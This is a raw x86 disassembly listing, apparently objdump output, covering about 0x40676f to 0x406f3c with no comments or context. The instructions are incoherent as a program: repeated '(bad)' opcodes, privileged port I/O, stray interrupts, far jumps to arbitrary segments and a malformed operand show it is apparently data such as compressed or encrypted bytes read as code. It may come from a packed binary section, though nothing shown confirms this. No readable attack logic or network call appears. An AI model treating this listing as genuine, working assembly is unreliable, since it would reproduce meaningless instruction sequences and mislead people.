  40676f:	add    esp,edi
  406771:	imul   esp,DWORD PTR [edi],0x2f3fa168
  406777:	test   al,0xe2
  406779:	(bad)  
  40677a:	cmp    al,0x7e
  40677c:	icebp  
  40677d:	inc    eax
  40677e:	imul   edi,DWORD PTR [eax-0x31],0x6
  406782:	sbb    al,dh
  406784:	xor    al,0xc6
  406786:	mov    esp,0x180a54f4
  40678b:	pop    edi
  40678c:	or     eax,0xccdc25b5
  406791:	daa    
  406792:	arpl   sp,sp
  406794:	sub    BYTE PTR [esi+0x1d],0x71
  406798:	jge    0x406749
  40679a:	fild   QWORD PTR [edi-0x51]
  40679d:	ja     0x406803
  40679f:	loopne 0x406731
  4067a1:	mov    eax,esi
  4067a3:	dec    edi
  4067a4:	cmp    DWORD PTR [ebp+0x25],0x312d454d
  4067ab:	or     DWORD PTR [ecx-0x78ec843b],ecx
  4067b1:	mov    dl,BYTE PTR ds:0x519759a8
  4067b7:	imul   esi,DWORD PTR [esi],0x55c31214
  4067bd:	sub    BYTE PTR [ecx],ch
  4067bf:	fst    st(5)
  4067c1:	inc    ecx
  4067c2:	or     ch,BYTE PTR ds:0x69c405f6
  4067c8:	jl     0x406828
  4067ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067cb:	or     DWORD PTR [edx+0x588d9045],ebp
  4067d1:	or     DWORD PTR [esi+eax*2],0xd75f8c93
  4067d8:	mov    ebp,0xae382cdb
  4067dd:	push   edi
  4067de:	pop    ecx
  4067df:	jns    0x40679e
  4067e1:	test   al,0x41
  4067e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067e4:	mov    cl,BYTE PTR [eax]
  4067e6:	push   ds
  4067e7:	pop    esi
  4067e8:	push   ds
  4067e9:	mov    cl,0xee
  4067eb:	adc    edx,DWORD PTR [eax-0x6e3faf9a]
  4067f1:	push   ebp
  4067f2:	push   ecx
  4067f3:	jae    0x406840
  4067f5:	inc    esi
  4067f6:	div    BYTE PTR [edi+ebp*8]
  4067f9:	pop    ds
  4067fa:	mov    eax,0x8af31c8c
  4067ff:	mov    ds:0x77704225,eax
  406804:	mov    dl,0x2b
  406806:	dec    edi
  406807:	pusha  
  406808:	push   ss
  406809:	fisttp WORD PTR [eax-0x22]
  40680c:	or     ah,dh
  40680e:	xor    DWORD PTR [ecx+0x37],ebp
  406811:	inc    eax
  406812:	sub    DWORD PTR [ecx+0x14],esp
  406815:	push   cs
  406816:	mov    eax,ds:0xbebef94a
  40681b:	fld    QWORD PTR [edx]
  40681d:	dec    edi
  40681e:	jb     0x4067f6
  406820:	add    dh,BYTE PTR [edx-0x1c376390]
  406826:	repnz lods eax,DWORD PTR ds:[esi]
  406828:	xor    BYTE PTR [eax+ebp*2],0x28
  40682c:	stos   DWORD PTR es:[edi],eax
  40682d:	icebp  
  40682e:	mov    ch,0xe5
  406830:	imul   esi,DWORD PTR [ecx+esi*8+0x2412e35f],0xa
  406838:	jmp    0x33d3:0x4b0fb81d
  40683f:	xor    BYTE PTR [ebx-0x44afcb4],0xe2
  406846:	xchg   BYTE PTR [esi-0x79035405],ch
  40684c:	mov    ebp,0xc0973e28
  406851:	in     al,dx
  406852:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406853:	push   eax
  406854:	push   ebx
  406855:	pop    ebx
  406856:	add    BYTE PTR [esi],al
  406858:	iret   
  406859:	ucomiss xmm7,DWORD PTR [eax-0x7e]
  40685d:	push   eax
  40685e:	sar    DWORD PTR [ebx],cl
  406860:	mov    ebx,0xee8ac417
  406865:	mov    eax,0xec2ef6e4
  40686a:	ret    
  40686b:	sub    cl,dl
  40686d:	sbb    eax,0x3072058e
  406872:	xor    esi,ebx
  406874:	out    dx,eax
  406875:	mov    ds:0x1232b73c,al
  40687a:	rcl    BYTE PTR [edi-0x6acbf6ff],0x9e
  406881:	test   eax,0xc8c8b601
  406886:	fadd   st,st(4)
  406888:	mov    DWORD PTR [ecx+0x67],esi
  40688b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40688c:	cmp    al,0xc1
  40688e:	mov    bl,0x11
  406890:	and    dh,bh
  406892:	adc    ah,ah
  406894:	xchg   ecx,eax
  406895:	sbb    DWORD PTR [ebp-0x22],0x67de16b8
  40689c:	mov    al,es:0x6637440a
  4068a2:	rcl    DWORD PTR [ecx+0x499c503a],1
  4068a8:	int3   
  4068a9:	sbb    al,0x91
  4068ab:	pop    esi
  4068ac:	inc    edx
  4068ad:	cld    
  4068ae:	cmp    ecx,ebp
  4068b0:	jns    0x40685d
  4068b2:	(bad)  ds:0x6bcc6a94
  4068b8:	mov    al,0xee
  4068ba:	sar    esp,0x89
  4068bd:	ss in  al,0xed
  4068c0:	sub    BYTE PTR [edi-0x51],al
  4068c3:	xor    ch,BYTE PTR [ecx]
  4068c5:	fwait
  4068c6:	and    bh,BYTE PTR [eax-0x31e8bcf3]
  4068cc:	push   eax
  4068cd:	jnp    0x406921
  4068cf:	rol    ebx,1
  4068d1:	jmp    0x4068b9
  4068d3:	add    dl,bl
  4068d5:	add    ebx,DWORD PTR [edi-0x56ce3eb0]
  4068db:	add    al,BYTE PTR [ebx]
  4068dd:	fcomp  DWORD PTR [eax+0x57b9adc9]
  4068e3:	xchg   DWORD PTR [ebp-0x7b1c1c7d],ebp
  4068e9:	lods   eax,DWORD PTR ds:[esi]
  4068ea:	test   al,0xc5
  4068ec:	sub    eax,0x9ebb854b
  4068f1:	dec    ecx
  4068f2:	lea    ebp,[edx+0x3a858237]
  4068f8:	xchg   BYTE PTR [edx+0x33eb7dde],al
  4068fe:	inc    esi
  4068ff:	pop    eax
  406900:	shl    DWORD PTR [ebx+esi*2-0x47d12b28],cl
  406907:	shr    bl,0x9d
  40690a:	add    al,0x45
  40690c:	jmp    0x4068ae
  40690e:	in     al,0x4f
  406910:	lahf   
  406911:	add    ebp,esp
  406913:	leave  
  406914:	jae    0x4068f5
  406916:	(bad)  
  406917:	push   0xdacd3336
  40691c:	pusha  
  40691d:	jnp    0x406971
  40691f:	or     DWORD PTR [eax+0xd1a51e],ebx
  406925:	xor    al,0xc5
  406927:	cwde   
  406928:	cdq    
  406929:	sub    ebp,DWORD PTR [edi+0x18]
  40692c:	pop    edi
  40692d:	sub    DWORD PTR [esi],ebx
  40692f:	sbb    eax,0x9bdfc4c0
  406934:	mov    al,0x17
  406936:	outs   dx,DWORD PTR ds:[esi]
  406937:	out    dx,eax
  406938:	and    BYTE PTR [edx-0x1c],0x29
  40693c:	pop    ss
  40693d:	imul   eax,DWORD PTR [eax],0xff602c34
  406943:	jecxz  0x4068f1
  406945:	stc    
  406946:	jbe    0x40696d
  406948:	cmp    ecx,ebp
  40694a:	pop    edx
  40694b:	int3   
  40694c:	pop    es
  40694d:	inc    ebp
  40694e:	sti    
  40694f:	in     eax,0x15
  406951:	lea    esi,[ebp+0x79]
  406954:	in     al,0x5d
  406956:	in     eax,0x5d
  406958:	shl    DWORD PTR [ebp+0x4a],1
  40695b:	sbb    ebp,DWORD PTR [eax]
  40695d:	pop    esi
  40695e:	pop    ebp
  40695f:	mov    fs,WORD PTR [edi]
  406961:	out    dx,al
  406962:	pop    ecx
  406963:	cmp    edx,DWORD PTR [edi-0x5b]
  406966:	retf   0x30a7
  406969:	shl    BYTE PTR [ecx-0x4e5f33a6],1
  40696f:	add    al,BYTE PTR [ebx+0x41]
  406972:	loope  0x406900
  406974:	stc    
  406975:	fisub  DWORD PTR [ebp+0x66]
  406978:	jecxz  0x40698b
  40697a:	out    dx,eax
  40697b:	jbe    0x4069b7
  40697d:	out    dx,eax
  40697e:	or     BYTE PTR [edx],ch
  406980:	enter  0x10df,0xb3
  406984:	aam    0xff
  406986:	xor    eax,0xaf1cb149
  40698b:	or     BYTE PTR [esi-0x622bd31d],dl
  406991:	inc    ebp
  406992:	sub    DWORD PTR [edx+0x74],eax
  406995:	mov    dl,0xa3
  406997:	hlt    
  406998:	push   esi
  406999:	xchg   esi,eax
  40699a:	adc    DWORD PTR [ebp+0x31],ebp
  40699d:	jecxz  0x406957
  40699f:	xchg   BYTE PTR [edi],bl
  4069a1:	push   es
  4069a2:	sub    al,0xdc
  4069a4:	or     esp,edi
  4069a6:	pop    ss
  4069a7:	call   FWORD PTR [edx-0x446c3f04]
  4069ad:	sbb    al,0x88
  4069af:	add    edx,DWORD PTR [edi]
  4069b1:	in     eax,dx
  4069b2:	popf   
  4069b3:	data16 sub bh,BYTE PTR [esi+0x39]
  4069b7:	xor    DWORD PTR [ebp+0x52216d62],ebx
  4069bd:	fdivr  DWORD PTR [esi+ebx*1]
  4069c0:	xlat   BYTE PTR ds:[ebx]
  4069c1:	fdivr  DWORD PTR [ebp+esi*4+0x10]
  4069c5:	push   esi
  4069c6:	std    
  4069c7:	arpl   WORD PTR [esi+0x7c],dx
  4069ca:	adc    BYTE PTR [edx],bl
  4069cc:	ins    DWORD PTR es:[edi],dx
  4069cd:	fwait
  4069ce:	xchg   BYTE PTR [eax-0x11],cl
  4069d1:	loop   0x40699e
  4069d3:	xor    cl,ch
  4069d5:	jns    0x4069b3
  4069d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069d8:	mov    ?,WORD PTR [eax*2-0x52e5c88a]
  4069df:	clc    
  4069e0:	pop    esi
  4069e1:	nop
  4069e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4069e3:	in     al,dx
  4069e4:	outs   dx,BYTE PTR ds:[esi]
  4069e5:	out    dx,al
  4069e6:	mov    ah,BYTE PTR [edi+edx*1+0x37292246]
  4069ed:	push   0xaf7b27be
  4069f2:	lock or bh,ch
  4069f5:	mov    dh,0xc
  4069f7:	add    DWORD PTR [ebp+ebx*2-0x5e],ebp
  4069fb:	idiv   BYTE PTR ds:0xf3bf3ee3
  406a01:	rcl    BYTE PTR [edx-0x17],1
  406a04:	xor    al,0xab
  406a06:	push   ebp
  406a07:	lock retf 
  406a09:	loop   0x406a0c
  406a0b:	adc    bh,al
  406a0d:	jmp    0x534e3f19
  406a12:	xchg   BYTE PTR [ebp+0x24e830a8],ch
  406a18:	int    0x3
  406a1a:	(bad)  
  406a1b:	push   ecx
  406a1c:	ins    DWORD PTR es:[edi],dx
  406a1d:	jo     0x406a8d
  406a1f:	mov    edx,0x75031c96
  406a24:	repnz call 0x4967:0x19d4f648
  406a2c:	rcr    DWORD PTR [ecx],cl
  406a2e:	add    cl,bh
  406a30:	sub    al,0x66
  406a32:	sti    
  406a33:	lahf   
  406a34:	adc    dl,BYTE PTR [edi+0x14]
  406a37:	loop   0x406a21
  406a39:	push   ecx
  406a3a:	and    BYTE PTR [ebx+0x46b91a0c],cl
  406a40:	int    0xea
  406a42:	push   esp
  406a43:	and    dh,BYTE PTR ds:0x445220e5
  406a49:	ret    0x7c94
  406a4c:	lahf   
  406a4d:	out    0x57,eax
  406a4f:	cwde   
  406a50:	push   esp
  406a51:	test   DWORD PTR [edx+0x28],edx
  406a54:	inc    ebx
  406a55:	out    dx,al
  406a56:	pop    DWORD PTR [edi-0x68]
  406a59:	ret    0xb0e0
  406a5c:	ret    0x6534
  406a5f:	jle    0x4069e2
  406a61:	xor    BYTE PTR [eax],bh
  406a63:	push   ecx
  406a64:	popa   
  406a65:	fnstenv [ebx+0x5db2b57e]
  406a6b:	cld    
  406a6c:	or     DWORD PTR [ecx],0xb144dca1
  406a72:	or     BYTE PTR [edx],al
  406a74:	lods   eax,DWORD PTR ds:[esi]
  406a75:	mov    dh,0x78
  406a77:	cmp    eax,0xa6c4ae68
  406a7c:	pop    ecx
  406a7d:	mov    ebx,0x2cab5573
  406a82:	add    eax,0xcddbefa1
  406a87:	xchg   ebx,eax
  406a88:	cwde   
  406a89:	adc    esp,DWORD PTR [edx+0x77]
  406a8c:	pop    esp
  406a8d:	not    BYTE PTR [edx-0x2f]
  406a90:	mov    dl,0xf
  406a92:	adc    BYTE PTR [ebx+edi*8-0x48b624f3],dh
  406a99:	or     eax,0xa29f97e4
  406a9e:	clc    
  406a9f:	mov    eax,ds:0xd3a4c3c6
  406aa4:	push   cs
  406aa5:	or     DWORD PTR [edi-0x66],edx
  406aa8:	cs call 0xa29e:0x646439d1
  406ab0:	int3   
  406ab1:	fmul   st(3),st
  406ab3:	fisubr WORD PTR ds:0x231b88d6
  406ab9:	mov    DWORD PTR [esi],esp
  406abb:	fdiv   QWORD PTR [esi+0x7c670398]
  406ac1:	leave  
  406ac2:	or     BYTE PTR [ebp+0x288ed899],dh
  406ac8:	sti    
  406ac9:	add    eax,0x91c03e82
  406ace:	pop    ds
  406acf:	jne    0x406b15
  406ad1:	dec    ebp
  406ad2:	jae    0x406ac1
  406ad4:	arpl   bx,si
  406ad6:	adc    ebx,ecx
  406ad8:	sub    al,0x7a
  406ada:	arpl   cx,si
  406adc:	addr16 pop ds
  406ade:	inc    ebp
  406adf:	out    0x13,eax
  406ae1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ae2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ae3:	iret   
  406ae4:	add    eax,0xbb2faae2
  406ae9:	lds    esp,FWORD PTR [eax]
  406aeb:	int    0x16
  406aed:	adc    dh,cl
  406aef:	ja     0x406aae
  406af1:	mov    ah,0x92
  406af3:	cmp    dl,cl
  406af5:	in     eax,dx
  406af6:	sti    
  406af7:	call   0x1a6bb83f
  406afc:	xchg   edx,eax
  406afd:	mov    ds:0x276d3c0e,al
  406b02:	mov    dl,BYTE PTR [esi+edx*2-0x2582e468]
  406b09:	in     al,0x67
  406b0b:	bswap  ebx
  406b0d:	cmp    dh,BYTE PTR [edx]
  406b0f:	out    0x1a,eax
  406b11:	and    al,0xb8
  406b13:	sbb    bh,BYTE PTR [edi+0x23]
  406b16:	icebp  
  406b17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b18:	(bad)  
  406b19:	mov    esp,0xb5540310
  406b1e:	pop    edi
  406b1f:	test   BYTE PTR [edx-0x22],dl
  406b22:	neg    DWORD PTR [edi-0xb]
  406b25:	lds    ebp,FWORD PTR [esi+0x17e799d0]
  406b2b:	jns    0x406b17
  406b2d:	jne    0x406b4f
  406b2f:	jge    0x406b88
  406b31:	and    eax,0xf3c6a1cb
  406b36:	push   esp
  406b37:	cs stc 
  406b39:	xor    ah,dh
  406b3b:	inc    DWORD PTR [edx-0x250ae419]
  406b41:	sub    al,0x58
  406b43:	scas   al,BYTE PTR es:[edi]
  406b44:	ret    0x854a
  406b47:	stos   BYTE PTR es:[edi],al
  406b48:	pop    edi
  406b49:	lahf   
  406b4a:	lahf   
  406b4b:	and    eax,0x9e73b288
  406b50:	lds    ebp,FWORD PTR [ebx-0x2c]
  406b53:	hlt    
  406b54:	dec    esi
  406b55:	xchg   ebp,eax
  406b56:	jno    0x406b5d
  406b58:	lods   eax,DWORD PTR ds:[esi]
  406b59:	stos   DWORD PTR es:[edi],eax
  406b5a:	pushf  
  406b5b:	sub    bl,BYTE PTR [ebx+ebp*4-0x5d]
  406b5f:	pop    esp
  406b60:	xlat   BYTE PTR ds:[ebx]
  406b61:	cwde   
  406b62:	xor    eax,DWORD PTR [edi+eiz*8-0x41]
  406b66:	ja     0x406b74
  406b68:	push   0x11
  406b6a:	pop    es
  406b6b:	je     0x406b44
  406b6d:	ficomp DWORD PTR [eax-0x5b1a4a3a]
  406b73:	outs   dx,BYTE PTR ds:[esi]
  406b74:	or     al,BYTE PTR [esi+0x540b2e62]
  406b7a:	(bad)  
  406b7b:	fcmovnbe st,st(7)
  406b7d:	cmp    BYTE PTR [ebp-0x62a3bb43],bh
  406b83:	pop    ebx
  406b84:	xchg   BYTE PTR [edx+0x7f],cl
  406b87:	sub    edx,DWORD PTR [ebp+0x6f]
  406b8a:	jb     0x406b5a
  406b8c:	and    eax,0x2e2fc2c1
  406b91:	je     0x406b58
  406b93:	cmp    ah,al
  406b95:	pop    ebp
  406b96:	sti    
  406b97:	add    DWORD PTR [esi],esi
  406b99:	mov    edx,0xdeadef5b
  406b9e:	mov    cl,0xe2
  406ba0:	mov    dl,0x79
  406ba2:	(bad)  
  406ba3:	into   
  406ba4:	and    ebp,ebp
  406ba6:	cmc    
  406ba7:	sbb    al,0xec
  406ba9:	push   edx
  406baa:	pop    ss
  406bab:	inc    eax
  406bac:	push   es
  406bad:	imul   edx,DWORD PTR [esi+0x28df6639],0xc6fa064d
  406bb7:	aam    0x66
  406bb9:	cmp    eax,0x1223658f
  406bbe:	mov    esp,0x3113a9fd
  406bc3:	popa   
  406bc4:	push   0x36
  406bc6:	fucomip st,st(6)
  406bc8:	mov    edx,0x1a683287
  406bcd:	cmp    esp,eax
  406bcf:	in     eax,0x45
  406bd1:	jg     0x406b6a
  406bd3:	and    ebp,DWORD PTR [ebx+0x7f]
  406bd6:	test   BYTE PTR [edi],cl
  406bd8:	mov    bl,0x28
  406bda:	and    DWORD PTR [ecx-0x7dab52bc],edi
  406be0:	xchg   esi,eax
  406be1:	mov    BYTE PTR [esi-0x2b2e7641],dl
  406be7:	mov    bl,0x24
  406be9:	mov    ds:0x895fa415,al
  406bee:	ins    BYTE PTR es:[edi],dx
  406bef:	push   0x21ec7938
  406bf4:	mov    es,WORD PTR [eax+0x27b0fc26]
  406bfa:	mov    cl,0x82
  406bfc:	inc    eax
  406bfd:	rcr    BYTE PTR [ebp-0x27493a3e],0x28
  406c04:	adc    al,BYTE PTR [eax-0x387c0ce1]
  406c0a:	or     al,BYTE PTR [ebx-0x5c]
  406c0d:	mov    al,0x8f
  406c0f:	lods   eax,DWORD PTR ds:[esi]
  406c10:	loopne 0x406bfb
  406c12:	adc    eax,0x6e41fd4d
  406c17:	push   es
  406c18:	test   BYTE PTR [esi],bl
  406c1a:	retf   0xbb63
  406c1d:	aaa    
  406c1e:	ficom  DWORD PTR [esi]
  406c20:	loopne 0x406c1f
  406c22:	add    al,0x6d
  406c24:	xchg   DWORD PTR [edi-0x125cc082],edx
  406c2a:	push   ecx
  406c2b:	js     0x406c04
  406c2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c2e:	cmp    dl,bh
  406c30:	jnp    0x406c01
  406c32:	xor    BYTE PTR [esi],bh
  406c34:	mov    ebx,DWORD PTR [ebx]
  406c36:	shl    BYTE PTR [edi+0x4c3b7ac1],0x6b
  406c3d:	pop    es
  406c3e:	enter  0xf365,0x8b
  406c42:	popa   
  406c43:	jmp    0xba5d8e7c
  406c48:	mov    dl,0x4a
  406c4a:	pop    ebp
  406c4b:	pusha  
  406c4c:	push   esi
  406c4d:	cmp    dl,0x1d
  406c50:	pop    ecx
  406c51:	leave  
  406c52:	lods   al,BYTE PTR ds:[esi]
  406c53:	push   ecx
  406c54:	mov    esi,0xf9d814bd
  406c59:	cmp    al,0xf4
  406c5b:	pop    es
  406c5c:	jmp    0xd8aa:0x85b5080a
  406c63:	call   FWORD PTR [eax]
  406c65:	cmp    cl,ch
  406c67:	stos   BYTE PTR es:[edi],al
  406c68:	dec    edi
  406c69:	inc    esp
  406c6a:	and    eax,0x842f0502
  406c6f:	test   eax,0xdc75c778
  406c74:	mov    ah,0x43
  406c76:	hlt    
  406c77:	and    eax,DWORD PTR [esi+0x4223e219]
  406c7d:	sbb    DWORD PTR [ecx-0x64],edx
  406c80:	loopne 0x406ccc
  406c82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c84:	rcl    DWORD PTR [edi+0x250a52b1],1
  406c8a:	call   0x3cd0d1e9
  406c8f:	sbb    DWORD PTR [ecx+0x3ff7a0f9],0xffffffcb
  406c96:	and    al,0xdb
  406c98:	lea    ebx,[ebx]
  406c9a:	push   eax
  406c9b:	(bad)  
  406c9c:	fld    TBYTE PTR [eax]
  406c9e:	sbb    al,0x23
  406ca0:	pop    ecx
  406ca1:	or     BYTE PTR [ebp-0x1c],al
  406ca4:	mov    eax,ds:0xb6051bdb
  406ca9:	mov    WORD PTR [ebx],cs
  406cab:	jne    0x406c6e
  406cad:	jne    0x406c70
  406caf:	mov    edx,0xb0818712
  406cb4:	into   
  406cb5:	mov    al,BYTE PTR [ebp+0x5fd05771]
  406cbb:	jns    0x406cf0
  406cbd:	sbb    bh,cl
  406cbf:	add    DWORD PTR [ecx+0x15],0x8da0dea5
  406cc6:	aam    0xf2
  406cc8:	dec    eax
  406cc9:	dec    ebx
  406cca:	pop    esi
  406ccb:	stos   DWORD PTR es:[edi],eax
  406ccc:	mov    dl,0x6f
  406cce:	inc    edx
  406ccf:	rol    esi,1
  406cd1:	mov    esp,0x77a7b044
  406cd6:	xchg   edx,ebx
  406cd8:	pop    edx
  406cd9:	xchg   ebp,eax
  406cda:	ret    
  406cdb:	stos   DWORD PTR es:[edi],eax
  406cdc:	nop
  406cdd:	cwde   
  406cde:	pusha  
  406cdf:	js     0x406cef
  406ce1:	popf   
  406ce2:	addr16 cmc 
  406ce4:	(bad)  
  406ce5:	mov    ebp,0x85cc3f5f
  406cea:	pop    ss
  406ceb:	fwait
  406cec:	adc    cl,bl
  406cee:	dec    edx
  406cef:	and    dh,bh
  406cf1:	dec    ebx
  406cf2:	sbb    edx,DWORD PTR ds:0x56cab4ba
  406cf8:	lock shl BYTE PTR [bp+si-0x42],cl
  406cfd:	adc    eax,0x68859045
  406d02:	or     al,0xbf
  406d04:	adc    DWORD PTR [edi+0x40],0x4f38e544
  406d0b:	aam    0x74
  406d0d:	ret    0x1ec7
  406d10:	push   ecx
  406d11:	and    dh,cl
  406d13:	jle    0x406cf8
  406d15:	aam    0xf3
  406d17:	ja     0x406d8f
  406d19:	sub    ebx,DWORD PTR [ebx+ebp*4-0x13bace54]
  406d20:	addr16 es leave 
  406d23:	stos   DWORD PTR es:[edi],eax
  406d24:	inc    ebp
  406d25:	jmp    0xa08e48cc
  406d2a:	fsubp  st(6),st
  406d2c:	repz sahf 
  406d2e:	out    0x13,al
  406d30:	enter  0x664b,0xc9
  406d34:	jmp    0x406cc3
  406d36:	icebp  
  406d37:	mov    al,ds:0x521e6a0a
  406d3c:	jno    0x406db4
  406d3e:	xchg   esp,eax
  406d3f:	adc    esi,ecx
  406d41:	repnz cld 
  406d43:	enter  0xdef0,0x5
  406d47:	adc    eax,0xfac2010a
  406d4c:	lods   eax,DWORD PTR ds:[esi]
  406d4d:	repnz ffreep st(3)
  406d50:	stc    
  406d51:	sbb    eax,0x941dfe5
  406d56:	bound  ecx,QWORD PTR [edi]
  406d58:	adc    al,0x10
  406d5a:	jbe    0x406d68
  406d5c:	adc    ebx,edi
  406d5e:	push   0x7324eadc
  406d63:	mov    al,ds:0x90820695
  406d68:	outs   dx,BYTE PTR ds:[esi]
  406d69:	xchg   DWORD PTR [ebx-0x80],ebp
  406d6c:	out    dx,al
  406d6d:	(bad)  
  406d6e:	js     0x406dd3
  406d70:	sub    edx,DWORD PTR [edx-0x746f04a9]
  406d76:	lods   al,BYTE PTR ds:[esi]
  406d77:	sub    eax,esp
  406d79:	adc    esp,0x11
  406d7c:	jmp    0x406d3d
  406d7e:	enter  0x732f,0x72
  406d82:	iret   
  406d83:	mov    cs,WORD PTR [ebx]
  406d85:	push   0xb595da9
  406d8a:	sub    eax,0x8d6c1f6e
  406d8f:	push   ebp
  406d90:	jbe    0x406d47
  406d92:	and    ch,BYTE PTR [edi]
  406d94:	dec    ecx
  406d95:	jl     0x406d75
  406d97:	pop    ss
  406d98:	aas    
  406d99:	div    DWORD PTR ds:0xa3c9256f
  406d9f:	sub    BYTE PTR [eax],0x40
  406da2:	(bad)  
  406da3:	fninit 
  406da5:	in     al,dx
  406da6:	add    al,0xe7
  406da8:	sahf   
  406da9:	push   cs
  406daa:	xchg   edx,eax
  406dab:	addr16 ds cmp dh,al
  406daf:	jle    0x406d4a
  406db1:	out    0xf1,al
  406db3:	jmp    0x123ab1da
  406db8:	lods   al,BYTE PTR ds:[esi]
  406db9:	mov    dh,0x95
  406dbb:	ror    BYTE PTR [esi+0x66],cl
  406dbe:	fistp  DWORD PTR [edx]
  406dc0:	pop    es
  406dc1:	inc    ebx
  406dc2:	int    0x49
  406dc4:	mov    DWORD PTR [ebp-0x4263b1ad],esp
  406dca:	pop    edx
  406dcb:	xchg   esp,eax
  406dcc:	add    eax,0x83eaa1db
  406dd1:	inc    ecx
  406dd2:	jns    0x406db8
  406dd4:	fst    st(1)
  406dd6:	(bad)  
  406dd7:	sub    al,0x28
  406dd9:	call   0x8644:0xf7b4d5bc
  406de0:	sbb    al,BYTE PTR [esp+ebx*1+0x38]
  406de4:	push   ecx
  406de5:	lods   al,BYTE PTR ds:[esi]
  406de6:	retf   0x10f6
  406de9:	(bad)  
  406dea:	dec    edi
  406deb:	mov    ch,0xf8
  406ded:	sub    al,0x2a
  406def:	adc    eax,0x51b7d9d5
  406df4:	cmp    ebp,edi
  406df6:	stc    
  406df7:	gs cs in al,dx
  406dfa:	(bad)  
  406dfb:	push   0xd887d137
  406e00:	int    0x23
  406e02:	push   ebx
  406e03:	imul   ebx,esi,0x2fb71a90
  406e09:	and    esp,ebx
  406e0b:	neg    cl
  406e0d:	or     al,0x5e
  406e0f:	int    0x65
  406e11:	adc    bl,ah
  406e13:	jae    0x406dc3
  406e15:	loopne 0x406df3
  406e17:	mov    dl,0x76
  406e19:	mov    ecx,0x29bbf4cd
  406e1e:	push   0x6a
  406e20:	inc    esp
  406e21:	jb     0x406e71
  406e23:	fwait
  406e24:	xor    bl,BYTE PTR [ebx+edx*8-0xafb233b]
  406e2b:	dec    ebp
  406e2c:	loopne 0x406ddf
  406e2e:	jb     0x406e1c
  406e30:	jae    0x406e3b
  406e32:	inc    ebp
  406e33:	jmp    0x406e96
  406e35:	add    ebx,DWORD PTR [esi]
  406e37:	push   eax
  406e38:	outs   dx,BYTE PTR ds:[esi]
  406e39:	add    al,0x5c
  406e3b:	int    0xe6
  406e3d:	daa    
  406e3e:	aad    0xfb
  406e40:	pop    edx
  406e41:	fs repz sub bh,ah
  406e45:	ds push ss
  406e47:	jmp    0x1385:0xa8a94a13
  406e4e:	aad    0x9f
  406e50:	pop    edx
  406e51:	ret    
  406e52:	popa   
  406e53:	push   cs
  406e54:	mov    eax,DWORD PTR [ecx-0x5d1fcacc]
  406e5a:	mov    dh,0x39
  406e5c:	test   DWORD PTR [ebp-0x3abf9826],0x319808e6
  406e66:	lods   eax,DWORD PTR ds:[esi]
  406e67:	inc    ebx
  406e68:	jae    0x406ec4
  406e6a:	xor    eax,DWORD PTR [ebp-0xae4f318]
  406e70:	mov    bl,BYTE PTR [esi+eax*1-0x2925d1ee]
  406e77:	hlt    
  406e78:	mov    ebx,0x75824180
  406e7d:	arpl   WORD PTR [edi+0x41998be0],dx
  406e83:	or     DWORD PTR [eiz*1+0x6a18b587],edi
  406e8a:	je     0x406e19
  406e8c:	rcr    BYTE PTR [edi],0x58
  406e8f:	push   eax
  406e90:	adc    DWORD PTR [ebx+0x5fada1b9],0xffffff99
  406e97:	clc    
  406e98:	popa   
  406e99:	xchg   ecx,eax
  406e9a:	js     0x406eaa
  406e9c:	out    0x4a,eax
  406e9e:	fild   QWORD PTR [eax-0x399abaf9]
  406ea4:	add    ebx,DWORD PTR [ebx]
  406ea6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ea7:	cmc    
  406ea8:	mov    ds:0x810afab7,al
  406ead:	add    ebp,DWORD PTR [ecx+0x413d8970]
  406eb3:	(bad)  
  406eb4:	dec    edx
  406eb5:	xchg   ebp,eax
  406eb6:	not    DWORD PTR [ecx+esi*8]
  406eb9:	mov    edi,0x22ceedd4
  406ebe:	pop    ecx
  406ebf:	cmp    ebp,ebx
  406ec1:	leave  
  406ec2:	mov    esi,0x1e997c3c
  406ec7:	jae    0x406e7a
  406ec9:	in     eax,0xc0
  406ecb:	lahf   
  406ecc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ecd:	dec    esp
  406ece:	and    DWORD PTR [eax-0x49],0x51
  406ed2:	ins    DWORD PTR es:[edi],dx
  406ed3:	xor    edx,0xdcaf4dd8
  406ed9:	or     al,0x6a
  406edb:	into   
  406edc:	iret   
  406edd:	sub    ebp,edx
  406edf:	xchg   ecx,eax
  406ee0:	(bad)  
  406ee1:	or     bh,BYTE PTR gs:[edx]
  406ee4:	outs   dx,BYTE PTR ds:[esi]
  406ee5:	inc    edx
  406ee6:	push   0xfffffffe
  406ee8:	dec    edi
  406ee9:	(bad)  
  406eea:	cld    
  406eeb:	mov    ds:0xcf8d0799,eax
  406ef0:	scas   al,BYTE PTR es:[edi]
  406ef1:	popa   
  406ef2:	fidivr WORD PTR [eax]
  406ef4:	add    al,BYTE PTR [ecx-0x6c86b45c]
  406efa:	cmp    al,0xf8
  406efc:	enter  0x5465,0x2c
  406f00:	push   0x4c
  406f02:	cvtpi2ps xmm1,QWORD PTR [edx]
  406f05:	xor    ah,BYTE PTR [edi-0x9]
  406f08:	arpl   WORD PTR gs:[ecx+0x549357f5],bp
  406f0f:	xchg   ch,bl
  406f11:	mov    ds:0xf30f371d,eax
  406f16:	test   BYTE PTR [ebx],bl
  406f18:	cmc    
  406f19:	retf   
  406f1a:	jno    0x406efb
  406f1c:	sbb    DWORD PTR [ebx-0x46],ebp
  406f1f:	jecxz  0x406f8b
  406f21:	pop    ebp
  406f22:	jb     0x406f4a
  406f24:	fs inc edx
  406f26:	pop    edx
  406f27:	aaa    
  406f28:	lahf   
  406f29:	cmp    cl,bl
  406f2b:	pop    ds
  406f2c:	xchg   edi,eax
  406f2d:	es fwait
  406f2f:	cs pusha 
  406f31:	xchg   ecx,eax
  406f32:	mov    ds:0x825be159,eax
  406f37:	iret   
  406f38:	rcr    BYTE PTR [eax-0x69],0xec
  406f3c:	dec    esi
